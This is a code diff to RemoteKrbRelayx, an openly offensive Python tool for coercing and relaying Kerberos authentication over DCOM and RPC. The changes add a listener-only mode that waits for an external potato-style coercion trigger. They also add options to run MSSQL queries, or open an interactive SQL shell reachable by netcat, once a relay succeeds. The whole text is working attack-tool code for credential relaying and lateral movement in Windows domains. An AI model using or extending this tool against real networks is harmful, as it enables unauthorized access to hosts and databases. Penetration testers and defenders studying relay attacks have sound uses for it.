@@ -45,7 +45,7 @@ def main():
 
     parser = argparse.ArgumentParser(add_help = True, description = "RemoteKrbRelayx - A tool for coercing and relaying Kerberos authentication over DCOM and RPC. By Ole Fredrik Borgundvåg Berg / Helse- og KommuneCERT (@olefredrikberg)")
 
-    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address of machine to coerce>')
+    parser.add_argument('target', action='store', nargs='?', default=None, help='[[domain/]username[:password]@]<targetName or address of machine to coerce>. Not required in listener mode (-l).')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-lootdir', action='store', type=str, required=False, metavar='LOOTDIR', default='.', help='Loot directory in which gathered loot (like certificates or dumps) will be stored (default: current directory).')
 
@@ -57,6 +57,7 @@ def main():
     group = parser.add_argument_group('listener')
     group.add_argument('-local-ip', action='store', metavar="IP", help='The local IP address to listen on (and coerce the target to connect to if -coerce-to is not specified)', required=True)
     group.add_argument('-ipv6', action='store_true',help='Use IPv6')
+    group.add_argument('-l', '-listener', dest='listener', action='store_true', help='Listener-only mode: start the RPC relay server and WAIT for an EXTERNAL coercion/trigger (e.g. a local krm4 / RemotePotato trigger pointing the OXID resolver here) instead of running the built-in potato trigger. No target is required.')
 
     group = parser.add_argument_group('relay')
     group.add_argument('-spn', action='store', metavar="PROTOCOL/SERVER", help='SPN to use for the kerberos relaying. This SPN will be in the ResolveOxid2 response and only kerberos with this SPN will be relayed (default HOST/[relay-target])')
@@ -100,6 +101,9 @@ def main():
                         'of executing a command after a successful relay. This console will listen locally on a '
                         ' tcp port and can be reached with for example netcat.')
 
+    group = parser.add_argument_group("MSSQL attack options")
+    group.add_argument('-q', '-query', dest='query', action='append', metavar='QUERY', help='MSSQL query to run on a successful relay (repeatable). Omit with -interactive to get an interactive SQL shell (reachable with netcat on 127.0.0.1:11000).')
+
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
@@ -120,14 +124,21 @@ def main():
     if not options.relay_target and not options.alternate_server:
         parser.error('You must specify a relay target with -relay-target or an alternate server with -alternate-server')
 
-    domain, username, password, address = utils.parse_target(options.target)
+    if options.listener:
+        # Listener mode: we do NOT run the built-in trigger, so no target/creds are needed.
+        domain = username = password = address = None
+    else:
+        if not options.target:
+            parser.error('A target is required unless -l/-listener is used.')
 
-    if domain is None:
-        domain = ''
+        domain, username, password, address = utils.parse_target(options.target)
 
-    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
-        from getpass import getpass
-        password = getpass("Password: ")
+        if domain is None:
+            domain = ''
+
+        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
+            from getpass import getpass
+            password = getpass("Password: ")
 
     if options.aesKey is not None:
         options.k = True
@@ -179,25 +190,41 @@ def main():
     c.setAlternateSmbPipe(options.alternate_smb_pipe)
     c.setAlternateProtocol(options.alternate_protocol)
     c.setCoerceTo(options.coerce_to)
-    c.setInteractive(options.interactive) 
+    c.setInteractive(options.interactive)
+    c.queries = options.query
 
     s = RPCRelayServer(c)
     s.start()
-    threads.add(s)   
+    threads.add(s)
 
-    potato = Potato(domain, username, password, address, options)
-    potato.run()
-
-    while True:
-        if s.server.attack_thread is not None and not options.interactive:
-            s.server.attack_thread.join()
-            break
-        if all(not thread.is_alive() for thread in threads):
-            break
+    # RPCRelayServer.run() creates s.server asynchronously in its thread; wait for it.
+    # (The built-in potato trigger used to mask this race with its own delay; -l has none.)
+    while s.server is None and s.is_alive():
         time.sleep(0.1)
+    if s.server is None:
+        logging.error('RPC relay server failed to start (port %d in use? stray OXID resolver?)' % options.local_port)
+        sys.exit(1)
+
+    if options.listener:
+        logging.info('Listener mode (-l): RPC relay server up on %s:%d -> %s (SPN %s).' % (options.local_ip, options.local_port, options.relay_target, options.spn))
+        logging.info('NOT running the built-in trigger. Fire your own coercion now, pointing the victim\'s OXID resolver at %s.' % options.coerce_to)
+    else:
+        potato = Potato(domain, username, password, address, options)
+        potato.run()
+
+    try:
+        while True:
+            if s.server is not None and s.server.attack_thread is not None and not options.interactive:
+                s.server.attack_thread.join()
+                break
+            if all(not thread.is_alive() for thread in threads):
+                break
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        pass
 
     stop_servers(threads)
-    
+
     sys.exit(0)
 
 if __name__ == '__main__':
